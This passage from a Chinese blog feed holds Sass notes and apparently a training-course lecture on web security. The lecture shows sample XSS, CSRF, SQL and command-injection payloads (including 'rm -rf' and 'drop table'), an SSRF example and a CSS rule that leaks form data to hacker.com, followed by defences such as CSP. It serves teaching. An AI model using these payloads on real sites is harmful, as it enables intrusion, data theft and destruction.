<code>@import</code>。<br>尽管通常在sass中使用<code>@import</code>时，sass会尝试找到对应的sass文件并导入进来，但在下列三种情况下会生成原生的CSS<code>@import</code>，这会造成浏览器解析css时的额外下载：</p><ul><li>被导入文件的名字以.css结尾；</li><li>被导入文件的名字是一个URL地址（比如http://www.sass.hk/css/css.css），由此可用谷歌字体API提供的相应服务；</li><li>被导入文件的名字是CSS的url()值。</li></ul><p>so 不能用sass的@import直接导入一个原始的css文件，因为sass会认为你想用css原生的@import。</p><p>但是，因为sass的语法完全兼容css，所以你可以<strong>把原始的css文件改名为.scss后缀，即可直接导入了</strong></p><h2 id="4.-静默注释">4. 静默注释<a title="#4.-静默注释" href="#4.-静默注释"></a></h2><p>sass 提供了一种不同于 css 标准的注释格式 <code>//</code> , 在编译成 css 后，这些用 <code>//</code> 的注释语句都会被抹去</p><h2 id="5.-混合器-@mixin-@include">5. 混合器 <code>@mixin</code> <code>@include</code><a title="#5.-混合器-@mixin-@include" href="#5.-混合器-@mixin-@include"></a></h2><p>需要大段大段的重用样式的代码，可以通过sass的混合器实现大段样式的重用。</p><p>混合器使用<code>@mixin</code>标识符定义。这个标识符给一大段样式赋予一个名字，可以通过引用这个名字重用这段样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> rounded-corners &#123;</span><br><span class="line">  -moz-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  -webkit-<span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">notice &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: green;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">2px</span> solid <span class="number">#00aa00</span>;</span><br><span class="line">  <span class="keyword">@include</span> rounded-corners;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* less */</span></span><br><span class="line"><span class="selector-class">.post</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: red;</span><br><span class="line">  rounded-corners();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.1-使用混合器的时间">5.1 使用混合器的时间<a title="#5.1-使用混合器的时间" href="#5.1-使用混合器的时间"></a></h3><p>混合器是在样式表中应用的。混合器是展示性的描述，用来描述一条css规则应用之后会产生怎样的效果。</p><p>混合器和类配合使用写出整洁的html和css，因为使用语义化的类名亦可以帮你避免重复使用混合器。</p><h3 id="5.2-混合器中css规则">5.2 混合器中css规则<a title="#5.2-混合器中css规则" href="#5.2-混合器中css规则"></a></h3><p>不仅可以包含属性，也可以包含css规则，包含选择器和选择器中的属性</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> no-bullets &#123;</span><br><span class="line">  <span class="attribute">list-style</span>: none;</span><br><span class="line">  <span class="selector-tag">li</span> &#123;</span><br><span class="line">    <span class="attribute">list-style-image</span>: none;</span><br><span class="line">    <span class="attribute">list-style-type</span>: none;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.3-给混合器传参">5.3 给混合器传参<a title="#5.3-给混合器传参" href="#5.3-给混合器传参"></a></h3><p>可以通过在@include混合器时给混合器传参，来定制混合器生成的精确样式</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> link-colors($normal, $<span class="attribute">hover</span>, $visited) &#123;</span><br><span class="line">  <span class="attribute">color</span>: $normal;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> &#123; <span class="attribute">color</span>: $hover; &#125;</span><br><span class="line">  &amp;<span class="selector-pseudo">:visited</span> &#123; <span class="attribute">color</span>: $visited; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="keyword">@include</span> link-colors(blue, red, green);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过$name: value的形式指定每个参数的值 */</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="keyword">@include</span> link-colors(</span><br><span class="line">      $<span class="attribute">normal</span>: blue,</span><br><span class="line">      $<span class="attribute">visited</span>: green,</span><br><span class="line">      $<span class="attribute">hover</span>: red</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5.4-默认参数值">5.4 默认参数值<a title="#5.4-默认参数值" href="#5.4-默认参数值"></a></h3><p>参数默认值使用$name: default-value的声明形式，默认值可以是任何有效的css属性值，甚至是其他参数的引用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@mixin</span> link-colors(</span><br><span class="line">    $normal,</span><br><span class="line">    $<span class="attribute">hover</span>: $normal,</span><br><span class="line">    $<span class="attribute">visited</span>: $normal</span><br><span class="line">  )&#123;</span><br><span class="line">  <span class="attribute">color</span>: $normal;</span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> &#123; <span class="attribute">color</span>: $hover; &#125;</span><br><span class="line">  &amp;<span class="selector-pseudo">:visited</span> &#123; <span class="attribute">color</span>: $visited; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="6.-使用选择器继承-@extend">6. 使用选择器继承 <code>@extend</code><a title="#6.-使用选择器继承-@extend" href="#6.-使用选择器继承-@extend"></a></h2><blockquote><p>if 想重用语义化</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.error</span> &#123;</span><br><span class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#fdd</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.seriousError</span> &#123;</span><br><span class="line">  <span class="keyword">@extend</span> .error;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">3px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>.seriousError</code>将会继承样式表中任何位置处为<code>.error</code>定义的所有样式<br>==<br>以<code>class=&quot;seriousError&quot;</code> 修饰的html元素最终的展示效果就好像是<code>class=&quot;seriousError error&quot;</code>。</p></blockquote><h3 id="6.1-什么时候使用继承">6.1 什么时候使用继承<a title="#6.1-什么时候使用继承" href="#6.1-什么时候使用继承"></a></h3><p><strong>混合器</strong>主要用于展示性样式的重用，而类名用于语义化样式的重用。因为<strong>继承是基于类</strong>的（有时是基于其他类型的选择器），所以继承应该是建立在语义化的关系上。</p><h3 id="6.2-继承的高级用法">6.2 继承的高级用法<a title="#6.2-继承的高级用法" href="#6.2-继承的高级用法"></a></h3><p>最常用的一种高级用法是继承一个html元素的样式。尽管默认的浏览器样式不会被继承，因为它们不属于样式表中的样式，但是你对html元素添加的所有样式都会被继承</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.disabled</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: gray;</span><br><span class="line">  <span class="keyword">@extend</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.disabled</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: gray;</span><br><span class="line">  <span class="keyword">@extend</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>if 一条样式规则继承了一个复杂的选择器，那么它只会继承这个复杂选择器命中的元素所应用的样式</p></blockquote><h3 id="6.3-继承的工作细节">6.3 继承的工作细节<a title="#6.3-继承的工作细节" href="#6.3-继承的工作细节"></a></h3><p><code>@extend</code>背后最基本的想法是:<br>如果<code>.seriousError @extend .error</code>， 那么样式表中的任何一处<code>.error</code>都用<code>.error.seriousError</code>这一选择器组进行替换。这就意味着相关样式会如预期那样应用到<code>.error</code>和<code>.seriousError</code></p><blockquote><ul><li>跟混合器相比，<strong>继承生成的css代码相对更少</strong>。<br>因为<strong>继承仅仅是重复选择器，而不会重复属性</strong>，所以使用继承往往比混合器生成的css体积更小。如果你非常关心你站点的速度，请牢记这一点。</li></ul></blockquote><ul><li><strong>继承遵从css层叠</strong>的规则。当两个不同的css规则应用到同一个html元素上时，并且这两个不同的css规则对同一属性的修饰存在不同的值，根据权重选择。</li><li><strong>混合器本身不会引起css层叠的问题</strong>，因为混合器把样式直接放到了css规则中，而继承存在样式层叠的问题。被继承的样式会保持原有定义位置和选择器权重不变。</li></ul>]]></content>
      
      
      <categories>
          
          <category> workNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB 开发的安全之旅 - 字节青训营</title>
      <link href="/learningNotes/ByteDance/10%20%E5%88%98%E5%AE%87%E6%99%A8%20web%20%E5%BC%80%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85"/>
      <url>/learningNotes/ByteDance/10%20%E5%88%98%E5%AE%87%E6%99%A8%20web%20%E5%BC%80%E5%8F%91%E7%9A%84%E5%AE%89%E5%85%A8%E4%B9%8B%E6%97%85</url>
      
        <content type="html"><![CDATA[<blockquote><p>两个角度看安全：hacker 攻击、开发者 防御</p></blockquote><h2 id="攻击者">攻击者<a title="#攻击者" href="#攻击者"></a></h2><h3 id="xss-—-cross-site-scripting">XSS — Cross-Site Scripting<a title="#xss-—-cross-site-scripting" href="#xss-—-cross-site-scripting"></a></h3><p>攻击者在网站上提交一段恶意脚本 &lt;script&gt;&lt;/script&gt; ，网站将其当成自身dom执行编译。</p><ul><li><p>主要利用了：</p><ul><li>盲目信任用户提交内容</li><li>把用户提交的string 直接转化为 DOM<ul><li>document.write</li><li>element.innerHTML = anyString;</li><li>SSR(user_data)</li></ul></li></ul></li><li><p>特点：</p><ul><li>难以从 UI 上感知，暗地执行脚本</li><li>窃取用户信息 cookie/token</li><li>绘制 UI 例如弹窗，诱骗用户点击 / 填写表单</li></ul></li></ul><h4 id="存储型-stored-xss：">存储型 Stored XSS：<a title="#存储型-stored-xss：" href="#存储型-stored-xss："></a></h4><ul><li>恶意脚本被<strong>存放在数据库</strong>中</li><li>访问页面 -&gt; 读数据 == 被攻击</li><li>危害最大，对全部用户都可见</li></ul><h4 id="反射型-reflected：">反射型 Reflected：<a title="#反射型-reflected：" href="#反射型-reflected："></a></h4><ul><li><p>不涉及数据库</p></li><li><p><strong>从 URL 上攻击</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如 url 为 </span></span><br><span class="line"><span class="comment">// host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">render</span>(<span class="params">ctx</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; param &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    ctx.<span class="property">status</span> = <span class="number">200</span>;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">`&lt;div&gt;<span class="subst">$&#123; param &#125;</span>&lt;/div&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="基于-dom-dom-based：">基于 dom DOM-based：<a title="#基于-dom-dom-based：" href="#基于-dom-dom-based："></a></h4><ul><li><p>不需要服务器的参与</p></li><li><p>恶意攻击的发起 + 执行，<strong>全在浏览器完成</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 例如 url 为 </span></span><br><span class="line"><span class="comment">// host/path/?param=&lt;script&gt;alert(&#x27;123&#x27;)&lt;/script&gt;</span></span><br><span class="line"><span class="keyword">const</span> content = <span class="keyword">new</span> <span class="title function_">URL</span>(location.<span class="property">href</span>).<span class="property">searchParams</span>.<span class="title function_">get</span>(<span class="string">&quot;param&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="property">innerHTML</span> = content;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(div)</span><br></pre></td></tr></table></figure><blockquote><p>与反射型很像，区别在于 完成注入脚本的地方：反射型在 server端、DOM 在浏览器完成闭环</p></blockquote></li></ul><h4 id="基于-mutation-mutation-based：">基于 mutation Mutation-based：<a title="#基于-mutation-mutation-based：" href="#基于-mutation-mutation-based："></a></h4><ul><li><p>利用了浏览器渲染 DOM 的特性 – 独特优化</p></li><li><p>不同浏览器，会有区别 – 按浏览器进行攻击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert()&gt;&quot;</span>&gt;</span></span><br><span class="line">// 为</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot; &lt;/noscript&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;img src=&quot;</span><span class="attr">x</span>&quot; <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">    &quot;&quot;&quot;&gt;&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="csrf-跨站伪造请求-—-cross-site-request-forgery">CSRF 跨站伪造请求 — Cross-site request forgery<a title="#csrf-跨站伪造请求-—-cross-site-request-forgery" href="#csrf-跨站伪造请求-—-cross-site-request-forgery"></a></h3><p>在用户不知情的前提下，利用用户权限 cookie，构造指定 HTTP 请求，窃取或修改用户铭感信息</p><p>例子：银行转账</p><h4 id="get">GET<a title="#get" href="#get"></a></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot;</span>&gt;</span>点我抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://bank.com/transfer?to=hacker&amp;amount=100&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h4 id="post">POST<a title="#post" href="#post"></a></h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://bank.com/transfer_tons_of_money&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;amount&quot;</span> <span class="attr">value</span>=<span class="string">&quot;10000&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="injection-注入">Injection 注入<a title="#injection-注入" href="#injection-注入"></a></h3><h4 id="sql">SQL<a title="#sql" href="#sql"></a></h4><p>请求：SQL 参数 恶意注入</p><p>Server：运行 SQL code</p><p>获取其他数据、修改数据、删除数据…</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取请求字段  直接以字符串的形式拼接 SQL 语句</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">renderForm</span>(<span class="params">ctx</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; username, form_id &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">const</span> result = <span class="keyword">await</span> aql.<span class="title function_">query</span>(<span class="string">`</span></span><br><span class="line"><span class="string">select a,b,c from table</span></span><br><span class="line"><span class="string">where username = <span class="subst">$&#123;username&#125;</span></span></span><br><span class="line"><span class="string">and form_id = <span class="subst">$&#123; from_id &#125;</span></span></span><br><span class="line"><span class="string">`</span>);</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="title function_">renderForm</span>(result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/api&quot;</span>,&#123;</span><br><span class="line">    <span class="attr">method</span>:<span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">headers</span>:&#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">body</span>:<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">username</span>: <span class="string">&quot;any; drop table tabelname;&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 造成 select xxx from xxx drop table tablename 删库跑路</span></span><br></pre></td></tr></table></figure><h4 id="injection-不止于-sql">Injection 不止于 SQL<a title="#injection-不止于-sql" href="#injection-不止于-sql"></a></h4><ul><li><p>CLI 命令行</p></li><li><p>OS command 系统命令</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 视频格式转换</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">convertVideo</span>(<span class="params">ctx</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; video, options &#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line">    <span class="title function_">exec</span>(<span class="string">`convert-cli <span class="subst">$&#123; video &#125;</span> -o <span class="subst">$&#123; options &#125;</span>`</span>);</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/api&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">        <span class="attr">options</span>:<span class="string">`&#x27; &amp;&amp; rm -rf xxx`</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成 删除系统文件的命令 </span></span><br><span class="line"><span class="keyword">const</span> command = <span class="string">`convert-cli video -o &amp;&amp; rm -rf xxx`</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>除了删除还能进行 读取 修改</p></blockquote></li><li><p>Server-Side Request Forgery — ssrf，服务端伪造请求</p><blockquote><p>严格上说不是 injection ，但是原理类似</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请求 用户自定义 的callback url</span></span><br><span class="line"><span class="comment">// web server 通常有内网访问权限</span></span><br><span class="line">public <span class="keyword">async</span> <span class="title function_">webhook</span>(<span class="params">ctx</span>)&#123;</span><br><span class="line">    <span class="comment">// callback 可能是内网 url </span></span><br><span class="line">    <span class="comment">// e.g http://secret.com/get_employ_payrolls</span></span><br><span class="line">    ctx.<span class="property">body</span> = <span class="keyword">await</span> <span class="title function_">fetch</span>(ctx.<span class="property">query</span>.<span class="property">callback</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问 callback === 暴露内网信息</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="dos-—-denial-of-service">Dos — Denial of Service<a title="#dos-—-denial-of-service" href="#dos-—-denial-of-service"></a></h3><p>通过某种方式 构造特定请求，导致服务器资源被显著消耗，来不及响应更多请求，导致请求挤压，进而雪崩效应</p><h4 id="redos：基于正则表达式的-dos">ReDos：基于正则表达式的 Dos<a title="#redos：基于正则表达式的-dos" href="#redos：基于正则表达式的-dos"></a></h4><p>贪婪：n 次不行？n-1次再试试 — 回溯</p><blockquote><p>正则表达式的贪婪模式：</p><p>重复匹配时 <code>?</code>  与 <code>no ?</code>  满足<code>一个即可 </code> 与 <code>尽量多</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> greedyRegExp = <span class="string">&quot;/a+/&quot;</span>;  <span class="comment">// 有多少匹配多少</span></span><br><span class="line"><span class="keyword">const</span> nonGreedyRegExp = <span class="string">&quot;/a+?/&quot;</span> <span class="comment">// 有一个就可以</span></span><br><span class="line"><span class="keyword">const</span> str = <span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(greedyRegExp)[<span class="number">0</span>]) <span class="comment">//aaaaa</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(nonGreedyRegExp)[<span class="number">0</span>]) <span class="comment">//a</span></span><br></pre></td></tr></table></figure></blockquote><h4 id="logical-dos">Logical Dos<a title="#logical-dos" href="#logical-dos"></a></h4><ul><li>耗时的同步操作</li><li>数据库写入</li><li>SQL join</li><li>文件备份</li><li>循环执行逻辑</li></ul><h4 id="ddos-—-distributed-dos">DDos — Distributed Dos<a title="#ddos-—-distributed-dos" href="#ddos-—-distributed-dos"></a></h4><p>短时间内，来自大量僵尸设备的请求流量，服务器不能及时完成全部请求，导致请求堆积，进而雪崩效应，无法响应新请求。</p><p>特点：直接访问 IP、任意 API、消耗大量带宽</p><p>demo：SYN Flood 洪水攻击：攻击者发送很多 SYN 与服务器进行连接，但是不进行确认连接，</p><p>​              导致，握手没有完成， connection 不能被释放，达到最大可连接数，无法连接新请求</p><h3 id="传输层-—-中间人攻击">传输层 — 中间人攻击<a title="#传输层-—-中间人攻击" href="#传输层-—-中间人攻击"></a></h3><img src = 'https://i.bmp.ovh/imgs/2022/01/3c7be4efb4995095.png' style="zoom: 50%;" /><p>原因：</p><ul><li>明文传输</li><li>信息篡改不可知</li><li>对方身份未验证</li></ul><h2 id="防御篇">防御篇<a title="#防御篇" href="#防御篇"></a></h2><h3 id="xss">XSS<a title="#xss" href="#xss"></a></h3><ul><li><p>永远不信任用户的提交内容</p></li><li><p>不要将用户提交内容直接转换成 DOM</p></li><li><p>现成工具：</p><ul><li>前端：主流框架默认防御 xss、google-closure-library</li><li>服务端 node：DOMPurify</li></ul></li><li><p>用户需求：需要动态生成 DOM，需要注意的点：</p><ul><li><p>string 转 DOM：注意转译 new DOMParse()</p></li><li><p>上传 svg：对其进行扫描，避免生成图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>自定义跳转链接：要过滤，因为可以写js</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>自定义样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">input</span><span class="selector-attr">[type=radio]</span><span class="selector-class">.income-gt10k</span><span class="selector-pseudo">:checked</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;https://hacker.com/?income=gt10k&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="csp---content-security-policy-内容安全策略">CSP - Content Security Policy 内容安全策略<a title="#csp---content-security-policy-内容安全策略" href="#csp---content-security-policy-内容安全策略"></a></h3><ul><li>哪些源被认为是安全的</li><li>来自安全源的脚本可以执行，否则直接抛错</li><li>禁止 eval + inline script</li></ul><p>设置的方式：</p><ol><li><p>服务器的响应头部：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: script-src <span class="string">&#x27;self&#x27;</span> <span class="comment">// 同源</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Security</span>-<span class="title class_">Policy</span>: script-src <span class="string">&#x27;self&#x27;</span> <span class="attr">https</span>:<span class="comment">//domain.com //同源加 后面这个可以访问</span></span><br></pre></td></tr></table></figure></li><li><p>浏览器 meta：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">htpp-eqiuv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src self&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="csrf">CSRF<a 